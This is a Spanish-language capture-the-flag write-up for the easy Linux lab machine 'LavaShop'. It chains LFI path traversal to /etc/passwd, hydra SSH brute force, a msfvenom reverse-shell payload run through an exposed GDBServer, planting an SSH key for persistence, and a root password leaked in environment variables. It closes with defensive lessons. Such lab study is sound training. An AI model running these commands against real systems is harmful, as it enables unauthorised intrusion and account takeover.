# LavaShop

<img width="1354" height="629" alt="image" src="https://github.com/user-attachments/assets/d772bd85-e99b-4bef-9a67-105dc6161f58" />

**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 21/07/2026

## 0. Resumen
Máquina Linux fácil que simula una tienda online de lámparas de lava. 
El camino de explotación combina:
- Enumeración de usuarios mediante Local File Inclusion (LFI)
- Fuerza bruta SSH para el acceso inicial
- Explotación de GDBServer expuesto
- Escalada a root por filtración de credenciales

## 1. Reconocimiento

   Nmap
```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 -oA lavashop

-sCV: Ejecución de scripts por defecto de Nmap y detección de versión de los servicios que corren en cada puerto abierto
-Pn: Omite descubrimiento de host
-n: No resuelve nombres DNS
--open: Muestra solo puertos abiertos
-p-: Escanea todos los puertos (65535)
--min-rate 5000: Acelera escaneo enviando 5000 paquetes por segundo
-oA: Output en todos los formatos (.namp, .xml, .gnmap)
```

<img width="1015" height="266" alt="image" src="https://github.com/user-attachments/assets/21408f13-793e-4a8d-afe5-6c1c2c92d477" />

**Resultados:**
- Puerto 22: OpenSSH 9.2p1 (Debian 12)
- Puerto 80: Apache 2.4.62, redirige a `lavashop.thl`
- Puerto 1337: servicio sin identificar

### 2. Configuración de DNS local
```bash
echo "<IP> lavashop.thl" | sudo tee -a /etc/hosts
```

## 3. Enumeración WEB

<img width="1879" height="611" alt="image" src="https://github.com/user-attachments/assets/0d6ffd73-0b24-44f9-aa05-565ad9f849ac" />

### 3.1 Exploración manual
La web usa un parámetro GET `page` para navegar (`?page=products`, `?page=about`, etc.). Esto sugiere una posible inclusión de archivos del lado del servidor.

### 3.2 Fuzzing de directorios
```bash
gobuster dir -u http://lavashop.thl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```
<img width="1279" height="434" alt="image" src="https://github.com/user-attachments/assets/3b17f324-99fd-42b7-8759-70d548000100" />

Directorios de interés: `/pages/`, `/assets/`, `/includes/`

### 3.3 Enumeración recursiva de /pages/
```bash
gobuster dir -u http://lavashop.thl/pages -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

<img width="1338" height="413" alt="image" src="https://github.com/user-attachments/assets/b5d0a58e-998c-498d-8e3c-0c21f37ffcf9" />

## 4. Explotación — LFI Manual

### 4.1 Intentos fallidos sobre index.php
```bash
curl "http://lavashop.thl/index.php?page=../../../../etc/passwd"
curl "http://lavashop.thl/index.php?page=php://filter/convert.base64-encode/resource=index"
curl "http://lavashop.thl/index.php?page=../../../etc/passwd%00"
```
→ Todos devuelven 404 (hay validación/filtrado sobre `page`).

### 4.2 Fuzzing de parámetros ocultos
```bash
ffuf -u "http://lavashop.thl/pages/products.php?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1017

-u: URL
-w: Diccionario con nombres de parámetros comunes
-fs: Filtro de respuesta a 1017 bytes
```

<img width="1408" height="266" alt="image" src="https://github.com/user-attachments/assets/4185d658-df9d-4e48-89aa-884317cc8485" />

→ Parámetro descubierto: `file`

### 4.3 LFI
Prueba de parámetro `file` con path traversal para enumerar usuarios
```bash
curl "http://lavashop.thl/pages/products.php?file=../../../../etc/passwd" | grep /bin/bash
```

<img width="1196" height="113" alt="image" src="https://github.com/user-attachments/assets/5e823af4-b5e2-4694-bc41-b841d01c1310" />

→ Revela usuarios `debian` (UID 1000) y `Rodri` (UID 1001), ambos con shell /bin/bashy login interactivo

## 5. Acceso Inicial — Fuerza Bruta SSH

```bash
hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP>

-l: Nombre de usuario
-P: Diccionario con contraseñas comunes
-ssh: Protocolo objetivo
```

<img width="1549" height="190" alt="image" src="https://github.com/user-attachments/assets/942a3e0b-2b7e-4328-9e6c-a2ff38bedf1f" />

→ Obtiene la contraseña del usuario `Debian`

```bash
ssh debian@<IP>
```

## 6. Escalada de privilegios — GDBServer

### 6.1 Enumeración
```bash
sudo -l: no permitido
su:      requiere contraseña de root
ps -aux | grep 1337
```

<img width="1383" height="56" alt="image" src="https://github.com/user-attachments/assets/96b36a3e-21aa-4ce9-b4f0-b81efd2f351a" />

→ GDBServer corriendo como `Rodri`, escuchando en `0.0.0.0:1337`, con flag `--once`.

**GDBServer** permite depuración remota; si es accesible sin restricciones, un atacante puede subir un binario y ejecutarlo con los privilegios del usuario que lo ejecuta.

### 6.2 Generar payload
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 PrependFork=true -f elf -o binary.elf

-p: Payload de reverse shell para Linux_x64
-LHOST: IP máquina atacante
-LPORT: Puerto de la máquina atacante
-PrependFork= Hace fork antes de ejecutar shell para evitar cuelgue
-f: Formato de salida
-o: Output

chmod +x binary.elf
```

### 6.3 Explotar GDBServer
```bash
gdb binary.elf
```
## Dentro de GDB:
```bash
target extended-remote 10.0.2.19:1337 (IP y puerto de máquina víctima)
remote put binary.elf binary.elf (subida de archivo)
set remote exec-file /home/Rodri/binary.elf (archivo a ejecutar)
run (lanzar)
```

### 6.4 Listener (antes de ejecutar `run`)
```bash
nc -lvnp 4444
```

<img width="1300" height="61" alt="image" src="https://github.com/user-attachments/assets/20276f4e-8082-41ff-90e3-df2cf4a98ff3" />

→ Se obtiene la shell

### 6.5 Mejorar la shell (TTY)
```bash
SHELL=/bin/bash script -q /dev/null
^Z
stty raw -echo && fg
reset
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116
```

## 7. Escalada a root — Variables de entorno

### 7.1 Acceso SSH Estable como Rodri

En la víctima:
```bash
cd /home/Rodri
mkdir -p .ssh
chmod 700 .ssh
```

En atacante:
```bash
ssh-keygen -t rsa -f rodri_key
cat rodri_key.pub
```

De nuevo en la víctima:
```bash
echo "CLAVE_PÚBLICA" > /home/Rodri/.ssh/authorized_keys
chmod 600 /home/Rodri/.ssh/authorized_keys
```

Conexión:
```bash
ssh -i rodri_key Rodri@<IP>
```

<img width="1409" height="191" alt="image" src="https://github.com/user-attachments/assets/6eba8f83-c0ca-41f3-992c-fe54f6aacfb8" />

### 7.2 Enumerar variables de entorno
```bash
env
```

<img width="1674" height="523" alt="image" src="https://github.com/user-attachments/assets/29299a7c-507c-4c51-84f8-ffb9c812b5cd" />

→ Variable `env` contiene la contraseña filtrada de `root`

### 7.3 Escalada final
```bash
su root
```
<img width="1103" height="55" alt="image" src="https://github.com/user-attachments/assets/ecdb2f75-6dc7-4bdb-811a-e0750aee70f7" />

## 7.4 Flags
- user.txt: `/home/Rodri`
  
- root.txt: `/root`

## 8. Lecciones aprendidas

<img width="594" height="701" alt="image" src="https://github.com/user-attachments/assets/5423fa26-6128-4f8b-a5a3-c09e236a248b" />

- Los parámetros de archivos individuales deben auditarse en busca de LFI
- Servicios de depuración remota (GDBServer) expuestos sin autenticación son un vector crítico de RCE
- Las variables de entorno pueden filtrar credenciales sensibles — siempre revisar `env`, `printenv`, `/proc/*/environ`
